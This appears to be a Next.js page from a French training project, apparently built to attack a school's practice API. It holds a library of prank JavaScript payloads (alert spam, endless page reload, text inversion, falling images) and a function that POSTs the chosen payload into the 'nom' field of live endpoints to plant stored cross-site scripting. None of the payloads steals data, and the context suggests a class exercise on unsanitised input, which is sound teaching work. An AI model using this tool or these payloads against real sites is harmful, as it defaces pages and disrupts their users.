"use client";

import { useState } from "react";

export default function Home() {
  const [selectedApi, setSelectedApi] = useState(null);
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [selectedScript, setSelectedScript] = useState(null);
  const [feedback, setFeedback] = useState("");
  const [injectedScripts, setInjectedScripts] = useState([]);

  const apis = [
    {
      id: 1,
      title: "Pokemon",
      endpoint1: "types",
      endpoint1Url: "https://filrouge.uha4point0.fr/V2/pokemon/types",
      endpoint1Payload: [
        {
          nom: "",
          id: null,
          caracteristique: "",
          attaques: [""],
        },
      ],
      endpoint2: "pokemons",
      endpoint2Url: "https://filrouge.uha4point0.fr/V2/pokemon/pokemons",
      endpoint2Payload: [
        {
          nom: "",
          numero: null,
          id: null,
          type: null,
          image: "",
        },
      ],
    },
    {
      id: 2,
      title: "Miyazaki",
      endpoint1: "films",
      endpoint1Url: "https://filrouge.uha4point0.fr/V2/miyasaki/films",
      endpoint1Payload: [
        {
          nom: "",
          id: null,
          annee: null,
          note: "",
          Genre: [""],
          image: "",
          trailer: "",
        },
      ],
      endpoint2: "heros",
      endpoint2Url: "https://filrouge.uha4point0.fr/V2/miyasaki/heros",
      endpoint2Payload: [
        {
          nom: "",
          id: null,
          film: null,
          description: "",
          role: "",
        },
      ],
    },
    {
      id: 3,
      title: "Music",
      endpoint1: "groupes",
      endpoint1Url: "https://filrouge.uha4point0.fr/V2/music/groupes",
      endpoint1Payload: [
        {
          nom: "",
          id: null,
          chanteur: "",
          origin: "",
          genre: [""],
        },
      ],
      endpoint2: "albums",
      endpoint2Url: "https://filrouge.uha4point0.fr/V2/music/albums",
      endpoint2Payload: [
        {
          nom: "",
          id: null,
          artiste: null,
          pistes: null,
          sortie: "",
          couverture: "",
        },
      ],
    },
    {
      id: 4,
      title: "UHA40",
      endpoint1: "annees",
      endpoint1Url: "https://filrouge.uha4point0.fr/V2/UHA40/annees",
      endpoint1Payload: [
        {
          id: null,
          nom: "",
          mail: "",
          description: "",
          concerne: "",
          compétences: [""],
        },
      ],
      endpoint2: "certifications",
      endpoint2Url: "https://filrouge.uha4point0.fr/V2/UHA40/certifications",
      endpoint2Payload: [
        {
          id: null,
          annee: null,
          intitule: "",
          lienOpenClassRoom: "",
          image: "",
        },
      ],
    },
    {
      id: 5,
      title: "BrowseShop",
      endpoint1: "categories",
      endpoint1Url: "https://filrouge.uha4point0.fr/V2/browseShop/categories",
      endpoint1Payload: [
        {
          id: null,
          nom: "",
          description: "",
          filtreTag: "",
          nbrProduits: null,
          sousCategorie: [""],
        },
      ],
      endpoint2: "produits",
      endpoint2Url: "https://filrouge.uha4point0.fr/V2/browseShop/produits",
      endpoint2Payload: [
        {
          nom: "",
          description: "",
          id: null,
          categorie: null,
          URL: "",
          image: "",
        },
      ],
    },
    {
      id: 6,
      title: "BasketBall",
      endpoint1: "equipes",
      endpoint1Url: "https://filrouge.uha4point0.fr/V2/basketball/equipes",
      endpoint1Payload: [
        {
          id: null,
          nom: "",
          localisations: "",
          division: "",
          creation: "",
          couleurs: [""],
          logo: "",
        },
      ],
      endpoint2: "joueurs",
      endpoint2Url: "https://filrouge.uha4point0.fr/V2/basketball/joueurs",
      endpoint2Payload: [
        {
          id: null,
          nom: "",
          position: "",
          No: null,
          equipe: null,
          taille: null,
          poid: null,
        },
      ],
    },
    {
      id: 7,
      title: "UHA40",
      endpoint1: "annees",
      endpoint1Url: "https://filrouge.uha4point0.fr/V2/UHA40/annees",
      endpoint1Payload: [
        {
          id: null,
          nom: "",
          mail: "",
          description: "",
          concerne: "",
          compétences: [""],
        },
      ]
    },
    {
      id: 8,
      title: "BrowseShop",
      endpoint1: "categories",
      endpoint1Url: "https://filrouge.uha4point0.fr/V2/browseShop/categories",
      endpoint1Payload: [
        {
          id: null,
          nom: "",
          description: "",
          filtreTag: "",
          nbrProduits: null,
          sousCategorie: [""],
        },
      ],
      endpoint2: "produits",
      endpoint2Url: "https://filrouge.uha4point0.fr/V2/browseShop/produits",
      endpoint2Payload: [
        {
          nom: "",
          description: "",
          id: null,
          categorie: null,
          URL: "",
          image: "",
        },
      ],
    },
    {
      id: 9,
      title: "UNIX",
      endpoint1: "utilisateurs",
      endpoint1Url: "https://filrouge.uha4point0.fr/V2/UNIX/utilisateurs",
      endpoint1Payload: [
        {
          id: null,
          nom: "",
          niveau: "",
          password: "",
          groupes: [""],
        },
      ],
      endpoint2: "images",
      endpoint2Url: "https://filrouge.uha4point0.fr/V2/UNIX/images",
      endpoint2Payload: [
        {
          nom: "",
          description: "",
          id: null,
          owner: null,
          URL: "",
          image: "",
        },
      ],
    },
    {
      id: 10,
      title: "Constructeurs",
      endpoint1: "constructeurs",
      endpoint1Url: "https://filrouge.uha4point0.fr/V2/car/constructeurs",
      endpoint1Payload: [
        {
          id: null,
          nom: "",
          creation: null,
          fondateur: "",
          usines: [""],
          pays: "",
        },
      ],
      endpoint2: "voitures",
      endpoint2Url: "https://filrouge.uha4point0.fr/V2/car/voitures",
      endpoint2Payload: [
        {
          nom: "",
          description: "",
          id: null,
          constructeur: null,
          production: null,
          image: "",
        },
      ],
    },
    {
      id: 11,
      title: "Arbres",
      endpoint1: "types",
      endpoint1Url: "https://filrouge.uha4point0.fr/V2/arbres/types",
      endpoint1Payload: [
        {
          nom: "",
          id: null,
          taille: null,
          note: "",
          ravageurs: [""],
          image: "",
        },
      ],
      endpoint2: "especes",
      endpoint2Url: "https://filrouge.uha4point0.fr/V2/arbres/especes",
      endpoint2Payload: [
        {
          nom: "",
          id: null,
          type: null,
          feuille: "",
          fruits: "",
        },
      ],
    },
    {
      id: 12,
      title: "Livres",
      endpoint1: "auteurs",
      endpoint1Url: "https://filrouge.uha4point0.fr/V2/livres/auteurs",
      endpoint1Payload: [
        {
          "id": 1,
          "nom": "",
          "prenom": "",
          "naissance": "",
          "mort": "",
          "biographie": "",
          "photo": "",
          "genres": [
            "drame",
            "fantastique"
          ]
        }
      ]
    }
,
  ];
  const scripts = [
    {
      id: 1,
      name: "Alerte => que la fête commence ",
      code: "<script>alert('QUE LA FÊTE COMMENCE !');</script>"
    },
    {
      id: 2,
      name: "Inversion Texte",
      code: "<script>function invertText() {\n" +
          "    const elements = document.querySelectorAll('p, h1, h2, h3, h4, h5, h6 , li , div');\n" +
          "    elements.forEach((element) => {\n" +
          "        if (element.innerText && element.innerText.trim()) {\n" +
          "            let newText = element.innerText.split('').reverse().join('');\n" +
          "            element.innerText = newText;\n" +
          "        }\n" +
          "    });\n" +
          "}\n" +
          "invertText();</script>"
    },
    {
      id: 3,
      name: "Fond surprise",
      code: "<script>\n" +
          "function changeBackgroundColor() {\n" +
          "    const colors = ['red', 'green', 'blue', 'yellow', 'pink', 'orange' , 'purple' , 'black' , 'white' , 'gray' , 'brown' , 'cyan' , 'magenta' , 'lime' , 'maroon' , 'olive' , 'navy' , 'teal' , 'aqua' , 'fuchsia' , 'silver' , 'gold'];\n" +
          "    let index = 0;\n" +
          "    setInterval(() => {\n" +
          "        document.body.style.backgroundColor = colors[index];\n" +
          "        index = (index + 1) % colors.length;\n" +
          "    }, 500);\n" +
          "}\n" +
          "changeBackgroundColor();\n" +
          "</script>"
    },
    {
      id: 4,
      name: "AutoScroll",
      code: "<script>\n" +
          "function autoScroll() {\n" +
          "    window.scrollTo(0, document.body.scrollHeight);\n" +
          "    setTimeout(autoScroll, 100);\n" +
          "}\n" +
          "autoScroll();\n" +
          "</script>"
    },
    {
      id: 5,
      name: "Gay Text",
      code: "<script>\n" +
          "function rainbowText() {\n" +
          "    const textElements = document.querySelectorAll('p, h1, h2, h3, h4, h5, h6, li , div');\n" +
          "    const colors = ['red', 'orange', 'yellow', 'green', 'blue', 'indigo', 'violet'];\n" +
          "    let colorIndex = 0;\n" +
          "    textElements.forEach((element) => {\n" +
          "        setInterval(() => {\n" +
          "            element.style.color = colors[colorIndex % colors.length];\n" +
          "            colorIndex++;\n" +
          "        }, 500);\n" +
          "    });\n" +
          "}\n" +
          "rainbowText();\n" +
          "</script>"
    },
    {
      id: 6,
      name: "Fond Matrix アカ",
      code: "<script>\n" +
          "function matrixEffect() {\n" +
          "    const canvas = document.createElement('canvas');\n" +
          "    canvas.style.position = 'fixed';\n" +
          "    canvas.style.top = '0';\n" +
          "    canvas.style.left = '0';\n" +
          "    canvas.style.zIndex = '-1';\n" +
          "    document.body.appendChild(canvas);\n" +
          "    const context = canvas.getContext('2d');\n" +
          "    canvas.width = window.innerWidth;\n" +
          "    canvas.height = window.innerHeight;\n" +
          "    const katakana = 'アカサタナハマヤラワンアイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワン'.split('');\n" +
          "    const columns = canvas.width / 20;\n" +
          "    const drops = Array.from({ length: columns }, () => 1);\n" +
          "    function draw() {\n" +
          "        context.fillStyle = 'rgba(0, 0, 0, 0.05)';\n" +
          "        context.fillRect(0, 0, canvas.width, canvas.height);\n" +
          "        context.fillStyle = '#0f0';\n" +
          "        context.font = '20px monospace';\n" +
          "        for (let i = 0; i < drops.length; i++) {\n" +
          "            const text = katakana[Math.floor(Math.random() * katakana.length)];\n" +
          "            context.fillText(text, i * 20, drops[i] * 20);\n" +
          "            if (drops[i] * 20 > canvas.height && Math.random() > 0.95) {\n" +
          "                drops[i] = 0;\n" +
          "            }\n" +
          "            drops[i]++;\n" +
          "        }\n" +
          "    }\n" +
          "    setInterval(draw, 50);\n" +
          "}\n" +
          "matrixEffect();\n" +
          "</script>"
    },
    {
      id: 7,
      name: "AutoReload",
      code: "<script>\n" +
          "setInterval(() => {\n" +
          "    window.location.reload();\n" +
          "}, 1000);\n" +
          "</script>"
    },
    {
      id: 8,
      name: "Random Image Generator",
      code: "<script>\n" +
          "function randomImageGenerator() {\n" +
          "    const images = document.querySelectorAll('img');\n" +
          "    images.forEach((image) => {\n" +
          "        image.src = 'https://source.unsplash.com/random/400x400';\n" +
          "    });\n" +
          "}\n" +
          "randomImageGenerator();\n" +
          "</script>"
    },
    {
      id: 9,
      name: "FUIIIS !",
      code: "<script>\n" +
          "function makeAllElementsEscapeMouse() {\n" +
          "    document.querySelectorAll('p, h1, h2, h3, h4, h5, h6, li, img').forEach(element => {\n" +
          "        if (element.nodeName === 'SCRIPT' || element.nodeName === 'STYLE' || element.clientWidth === 0 && element.clientHeight === 0) {\n" +
          "            return;\n" +
          "        }\n" +
          "        element.style.position = 'absolute';\n" +
          "    });\n" +
          "    document.addEventListener('mousemove', (event) => {\n" +
          "        const mouseX = event.clientX;\n" +
          "        const mouseY = event.clientY;\n" +
          "        document.querySelectorAll('body *').forEach(element => {\n" +
          "            if (element.nodeName === 'SCRIPT' || element.nodeName === 'STYLE' || element.clientWidth === 0 && element.clientHeight === 0) {\n" +
          "                return;\n" +
          "            }\n" +
          "            const rect = element.getBoundingClientRect();\n" +
          "            const elementX = rect.left + rect.width / 2;\n" +
          "            const elementY = rect.top + rect.height / 2;\n" +
          "            const distanceX = elementX - mouseX;\n" +
          "            const distanceY = elementY - mouseY;\n" +
          "            const distance = Math.sqrt(distanceX * distanceX + distanceY * distanceY);\n" +
          "            if (distance < 100) {\n" +
          "                const angle = Math.atan2(distanceY, distanceX);\n" +
          "                const offset = 100 - distance;\n" +
          "                element.style.left = `${element.offsetLeft + offset * Math.cos(angle)}px`;\n" +
          "                element.style.top = `${element.offsetTop + offset * Math.sin(angle)}px`;\n" +
          "            }\n" +
          "        });\n" +
          "    });\n" +
          "}\n" +
          "makeAllElementsEscapeMouse();\n" +
          "</script>"
    },
    {
      id: 10,
      name: "BOOM + +",
      code: "<script>\n" +
          "function randomExplosionGIF() {\n" +
          "    const gifURLs = [\n" +
          "        'https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExenpxOG1hNWt5czhqMTNjc2ZtcHM3c3NlM29ydmpwZ29iaDJlZ2UzciZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9cw/4Z9p5iVHTo3CWW1Lpe/giphy.gif',\n" +
          "        'https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExMm9nd2huc2kzOW1yaXRxcWV6MHpoeDYwbGtyODdhcXgwd255bjIzbCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9cw/CiEJtfTfAF8y8kTAJO/giphy.gif',\n" +
          "        'https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExZzBhajVzdml2NXlkN2lqbWs0ZjdwcGVkaWVuZmU4cWVtcGpidnZ5bCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9cw/82guPJs4O7Kty6uRry/giphy.gif'\n" +
          "    ];\n" +
          "    function createExplosion() {\n" +
          "        const gif = document.createElement('img');\n" +
          "        gif.src = gifURLs[Math.floor(Math.random() * gifURLs.length)];\n" +
          "        gif.style.position = 'fixed';\n" +
          "        gif.style.width = '100px';\n" +
          "        gif.style.height = '100px';\n" +
          "        gif.style.left = Math.random() * window.innerWidth + 'px';\n" +
          "        gif.style.top = Math.random() * window.innerHeight + 'px';\n" +
          "        document.body.appendChild(gif);\n" +
          "        setTimeout(() => gif.remove(), 2000);\n" +
          "    }\n" +
          "    setInterval(createExplosion, 1000);\n" +
          "}\n" +
          "randomExplosionGIF();\n" +
          "</script>"
    },
    {
      id: 11,
      name: "Alert fiesta",
      code: "<script>\n" +
          "function spamAlerts() {\n" +
          "    const memeMessages = [\n" +
          "        'Incroyable.',\n" +
          "        'Se protéger est difficile.',\n" +
          "        'J’ai mal à mon PHP.',\n" +
          "        'J’ai mal à mon CSS.',\n" +
          "        'J’ai mal à mon JS.',\n" +
          "        'J’ai mal à mon HTML.',\n" +
          "        'strip_tags, c’est quoi?',\n" +
          "        'Ça ne va pas s’arrêter..',\n" +
          "        'Quand y’en a plus, y’en a encore.'\n" +
          "    ];\n" +
          "    setInterval(() => {\n" +
          "        const randomMessage = memeMessages[Math.floor(Math.random() * memeMessages.length)];\n" +
          "        alert(randomMessage);\n" +
          "    }, 5000);\n" +
          "}\n" +
          "spamAlerts();\n" +
          "</script>"

    },
    {
      id: 12,
      name: "Tchoo tchoo !",
      code: "<script>\n" +
          "function createMarquee(message) {\n" +
          "    const marquee = document.createElement('div');\n" +
          "    marquee.style.position = 'fixed';\n" +
          "    marquee.style.bottom = '0';\n" +
          "    marquee.style.width = '100%';\n" +
          "    marquee.style.color = 'black';\n" +
          "    marquee.style.padding = '10px';\n" +
          "    marquee.style.overflow = 'hidden';\n" +
          "    marquee.style.whiteSpace = 'nowrap';\n" +
          "    marquee.innerText = message;\n" +
          "    document.body.appendChild(marquee);\n" +
          "    let posX = window.innerWidth;\n" +
          "    setInterval(() => {\n" +
          "        posX -= 4;\n" +
          "        marquee.style.left = posX + 'px';\n" +
          "        if (posX < -marquee.clientWidth) {\n" +
          "            posX = window.innerWidth;\n" +
          "        }\n" +
          "    }, 50);\n" +
          "}\n" +
          "createMarquee('🚂🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃 Tchoo tchoo !');\n" +
          "</script>"
    },
    {
      id: 13,
      name: "Cube",
      code: "<script>\n" +
          "function create3DCube() {\n" +
          "    const cube = document.createElement('div');\n" +
          "    cube.innerHTML = `\n" +
          "        <style>\n" +
          "            .scene {\n" +
          "                perspective: 600px;\n" +
          "            }\n" +
          "            .cube {\n" +
          "                position: relative;\n" +
          "                width: 200px;\n" +
          "                transform-style: preserve-3d;\n" +
          "                animation: rotate 4s infinite linear;\n" +
          "            }\n" +
          "            @keyframes rotate {\n" +
          "                from { transform: rotateX(0) rotateY(0); }\n" +
          "                to { transform: rotateX(360deg) rotateY(360deg); }\n" +
          "            }\n" +
          "            .cube > div {\n" +
          "                position: fixed;\n" +
          "                width: 200px;\n" +
          "                height: 200px;\n" +
          "                background: rgba(255, 255, 255, 0.8);\n" +
          "                border: 1px solid #ccc;\n" +
          "            }\n" +
          "        </style>\n" +
          "        <div class='scene'>\n" +
          "            <div class='cube'>\n" +
          "                <div style='transform: translateZ(100px);'>DEVANT</div>\n" +
          "                <div style='transform: rotateY(90deg) translateZ(100px);'>DROITE</div>\n" +
          "                <div style='transform: rotateY(180deg) translateZ(100px);'>DERIERE</div>\n" +
          "                <div style='transform: rotateY(-90deg) translateZ(100px);'>GAUCHE</div>\n" +
          "                <div style='transform: rotateX(90deg) translateZ(100px);'>HAUT</div>\n" +
          "                <div style='transform: rotateX(-90deg) translateZ(100px);'>BAS</div>\n" +
          "            </div>\n" +
          "        </div>\n" +
          "    `;\n" +
          "    document.body.appendChild(cube);\n" +
          "}\n" +
          "create3DCube();\n" +
          "</script>"
    },
    {
      id: 14,
      name: "L'enfer de balles rebondissante",
      code: "<script>\n" +
          "function bouncingBalls() {\n" +
          "    const canvas = document.createElement('canvas');\n" +
          "    canvas.style.position = 'fixed';\n" +
          "    canvas.style.top = 0;\n" +
          "    canvas.style.left = 0;\n" +
          "    canvas.style.width = '100%';\n" +
          "    canvas.style.height = '100%';\n" +
          "    canvas.style.zIndex = '9999';\n" +
          "    document.body.appendChild(canvas);\n" +
          "    const ctx = canvas.getContext('2d');\n" +

          "    function resizeCanvas() {\n" +
          "        canvas.width = window.innerWidth;\n" +
          "        canvas.height = window.innerHeight;\n" +
          "    }\n" +
          "    window.addEventListener('resize', resizeCanvas);\n" +
          "    resizeCanvas();\n" +

          "    const balls = [];\n" +
          "    canvas.addEventListener('mousemove', (event) => {\n" +
          "        balls.push({\n" +
          "            x: event.clientX,\n" +
          "            y: event.clientY,\n" +
          "            dx: Math.random() * 4 - 2,\n" +
          "            dy: Math.random() * 4 - 2,\n" +
          "            radius: Math.random() * 20 + 10,\n" +
          "            color: 'hsl(' + Math.random() * 360 + ', 100%, 50%)'\n" +
          "        });\n" +
          "    });\n" +

          "    function animate() {\n" +
          "        ctx.clearRect(0, 0, canvas.width, canvas.height);\n" +
          "        balls.forEach(ball => {\n" +
          "            ctx.beginPath();\n" +
          "            ctx.arc(ball.x, ball.y, ball.radius, 0, Math.PI * 2);\n" +
          "            ctx.fillStyle = ball.color;\n" +
          "            ctx.fill();\n" +

          "            ball.x += ball.dx;\n" +
          "            ball.y += ball.dy;\n" +
          "            if (ball.x - ball.radius < 0 || ball.x + ball.radius > canvas.width) ball.dx = -ball.dx;\n" +
          "            if (ball.y - ball.radius < 0 || ball.y + ball.radius > canvas.height) ball.dy = -ball.dy;\n" +
          "        });\n" +
          "        requestAnimationFrame(animate);\n" +
          "    }\n" +
          "    animate();\n" +
          "}\n" +
          "bouncingBalls();\n" +
          "</script>"
    },
    {
      id: 15,
      name: "SQUISH",
      code: "<script src='https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js'></script>\n" +
          "<script>\n" +
          "function pixelate() {\n" +
          "    const canvas = document.createElement('canvas');\n" +
          "    canvas.width = window.innerWidth;\n" +
          "    canvas.height = window.innerHeight;\n" +
          "    canvas.style.position = 'fixed';\n" +
          "    canvas.style.top = 0;\n" +
          "    canvas.style.left = 0;\n" +
          "    canvas.style.zIndex = '9999';\n" +
          "    canvas.style.imageRendering = 'pixelated';\n" +
          "    document.body.appendChild(canvas);\n" +

          "    html2canvas(document.body, {useCORS: true}).then((screenshot) => {\n" +
          "        const ctx = canvas.getContext('2d');\n" +
          "        ctx.drawImage(screenshot, 0, 0, canvas.width, canvas.height);\n" +
          "        ctx.imageSmoothingEnabled = false;\n" +
          "    });\n" +
          "}\n" +
          "pixelate();\n" +
          "</script>"
    },
    {
      id: 16,
      name: "Banana Rain",
      code: "<script>\n" +
          "function bananaRain() {\n" +
          "    function createBanana() {\n" +
          "        const banana = document.createElement('img');\n" +
          "        banana.src = 'https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExdGRzajk1MTJ3YjBzN29qNDJrcm5xYzRiN2VnZXpxdmtvMmQycGFjMCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9cw/SgtT2lPhd4wevfp6hv/giphy.gif';\n" + // Ensure this is a valid URL
          "        banana.style.position = 'fixed';\n" +
          "        banana.style.top = '-100px';\n" +
          "        banana.style.left = `${Math.random() * window.innerWidth}px`;\n" +
          "        banana.style.width = '50px';\n" +
          "        banana.style.height = '100px';\n" +
          "        banana.style.zIndex = '1000';\n" +
          "        banana.style.transition = 'transform 3s ease-in';\n" +
          "        document.body.appendChild(banana);\n" +

          "        setTimeout(() => {\n" +
          "            banana.style.transform = `translateY(${window.innerHeight + 100}px)`;\n" +
          "        }, 100);\n" +

          "        // Remove the banana after it falls off the screen\n" +
          "        setTimeout(() => {\n" +
          "            banana.remove();\n" +
          "        }, 3200);\n" +
          "    }\n" +

          "    // Create a new banana every 500 milliseconds\n" +
          "    setInterval(createBanana, 500);\n" +
          "}\n" +
          "bananaRain();\n" +
          "</script>"
    },
    {
      id: 16,
      name: "RickRoll Rain",
      code: "<script>\n" +
          "function bananaRain() {\n" +
          "    function createBanana() {\n" +
          "        const banana = document.createElement('img');\n" +
          "        banana.src = 'https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExOGRzbWZ1eHc1cHUwZjEwNXg2ZzNzcHN4amlzY3Y1Y3B1MnJwdnZ0cSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/Ju7l5y9osyymQ/giphy.gif';\n" + // Ensure this is a valid URL
          "        banana.style.position = 'fixed';\n" +
          "        banana.style.top = '-100px';\n" +
          "        banana.style.left = `${Math.random() * window.innerWidth}px`;\n" +
          "        banana.style.width = '150px';\n" +
          "        banana.style.height = '75  px';\n" +
          "        banana.style.zIndex = '1000';\n" +
          "        banana.style.transition = 'transform 3s ease-in';\n" +
          "        document.body.appendChild(banana);\n" +

          "        setTimeout(() => {\n" +
          "            banana.style.transform = `translateY(${window.innerHeight + 100}px)`;\n" +
          "        }, 100);\n" +

          "        // Remove the banana after it falls off the screen\n" +
          "        setTimeout(() => {\n" +
          "            banana.remove();\n" +
          "        }, 3200);\n" +
          "    }\n" +

          "    // Create a new banana every 500 milliseconds\n" +
          "    setInterval(createBanana, 500);\n" +
          "}\n" +
          "bananaRain();\n" +
          "</script>"
    },

  ];
  const rainbowColors = ["bg-red-500", "bg-orange-500", "bg-yellow-500", "bg-green-500", "bg-blue-500", "bg-indigo-500", "bg-purple-500"];


  const openModal = (api : any) => {
    setSelectedApi(api);
    setIsModalOpen(true);
    setFeedback("");
    setSelectedScript(null);
  };

  const closeModal = () => {
    setIsModalOpen(false);
    setSelectedApi(null);
    setFeedback("");
    setSelectedScript(null);
  };

  const injectScript = async (url : any, payloadTemplate : any, endpoint : any) => {
    const payload = JSON.parse(JSON.stringify(payloadTemplate));
    payload[0].nom = selectedScript ? selectedScript.code : "";

    const params = new URLSearchParams();
    for (const key in payload[0]) {
      if (Array.isArray(payload[0][key])) {
        params.append(key, payload[0][key].join(","));
      } else {
        params.append(key, payload[0][key]);
      }
    }

    try {
      const response = await fetch(url, {
        method: "POST",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
        },
        body: params.toString(),
      });

      if (response.ok) {
        setFeedback("Injection réussie! 😈");
        setInjectedScripts([
          ...injectedScripts,
          {
            api: selectedApi.title,
            endpoint,
            script: selectedScript.name,
          },
        ]);
      } else {
        setFeedback("Injection échouée! 😡");
      }
    } catch (error) {
      setFeedback("Injection échouée! 😡 : " + error);
    }
  };

  return (
      <main className="flex min-h-screen flex-col items-center justify-between p-40">
        <div className="grid text-center lg:w-full lg:max-w-5xl lg:grid-cols-4 lg:text-left">
          {apis.map((api) => (
              <div
                  key={api.id}
                  className="group rounded-lg border border-transparent px-5 py-4 transition-colors hover:border-gray-300 hover:bg-gray-100 hover:dark:border-neutral-700 hover:dark:bg-neutral-800/30"
                  onClick={() => setSelectedApi(api)}
                  style={{ cursor: "pointer" }}
              >
                <h2 className="mb-3 text-2xl font-semibold">
                  {api.title}
                  <span className="inline-block transition-transform group-hover:translate-x-1 motion-reduce:transform-none">
                {" ->"}
              </span>
                </h2>
                <p className="m-0 text-sm opacity-50">
                  <strong>{api.endpoint1}</strong> / <strong>{api.endpoint2}</strong>
                </p>
              </div>
          ))}
        </div>

        {selectedApi && (
            <div className="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50">
              <div className="bg-white p-6 rounded-lg max-w-4xl w-full text-center relative">
                <h3 className="mb-4 text-lg font-semibold">
                  {selectedApi.title}.1 - Injection Fiesta Javascript
                </h3>
                <div className="grid grid-cols-3 gap-2 mb-16">
                  {scripts.map((script, index) => (
                      <button
                          key={script.id}
                          onClick={() => setSelectedScript(script)}
                          className={`px-4 py-2 rounded ${
                              selectedScript?.id === script.id
                                  ? `${rainbowColors[index % rainbowColors.length]} text-white`
                                  : `${rainbowColors[index % rainbowColors.length]} text-white hover:opacity-80`
                          }`}
                      >
                        {script.name}
                      </button>
                  ))}
                </div>
                <p className="text-center text-sm">
                  {selectedScript
                      ? `Script choisi : ${selectedScript.name}`
                      : "Pas de script choisi."}
                </p>
                <div className="flex flex-col space-y-2 mt-4">
                  <button
                      onClick={() =>
                          injectScript(
                              selectedApi.endpoint1Url,
                              selectedApi.endpoint1Payload,
                              selectedApi.endpoint1
                          )
                      }
                      className="bg-sky-500 px-4 py-2 rounded hover:bg-sky-400"
                  >
                    Injecter {selectedApi.endpoint1}
                  </button>
                  <button
                      onClick={() =>
                          injectScript(
                              selectedApi.endpoint2Url,
                              selectedApi.endpoint2Payload,
                              selectedApi.endpoint2
                          )
                      }
                      className="bg-pink-500 text-white px-4 py-2 rounded hover:bg-pink-600"
                  >
                    Injecter {selectedApi.endpoint2}
                  </button>
                </div>
                {feedback && <p className="mt-4 text-center">{feedback}</p>}
                <button onClick={closeModal} className="absolute top-0 right-0 p-2">
                  &times;
                </button>
              </div>
            </div>
        )}

        <div className="text-center mt-6">
          <h3 className="mt-4">Scripts injectés dans cette session :</h3>
          <table className="mx-auto mt-2 table-auto border-collapse border border-gray-400">
            <thead>
            <tr className="border border-gray-400">
              <th className="border border-gray-400 px-4 py-2">Script</th>
              <th className="border border-gray-400 px-4 py-2">API</th>
              <th className="border border-gray-400 px-4 py-2">Endpoint</th>
            </tr>
            </thead>
            <tbody>
            {injectedScripts.map((injection, index) => (
                <tr key={index} className="border border-gray-400">
                  <td className="border border-gray-400 px-4 py-2">
                    {injection.script}
                  </td>
                  <td className="border border-gray-400 px-4 py-2">
                    {injection.api}
                  </td>
                  <td className="border border-gray-400 px-4 py-2">
                    {injection.endpoint}
                  </td>
                </tr>
            ))}
            </tbody>
          </table>
        </div>
        <a href="https://filrouge.uha4point0.fr/v2">Page de reset</a>
      </main>
  );
}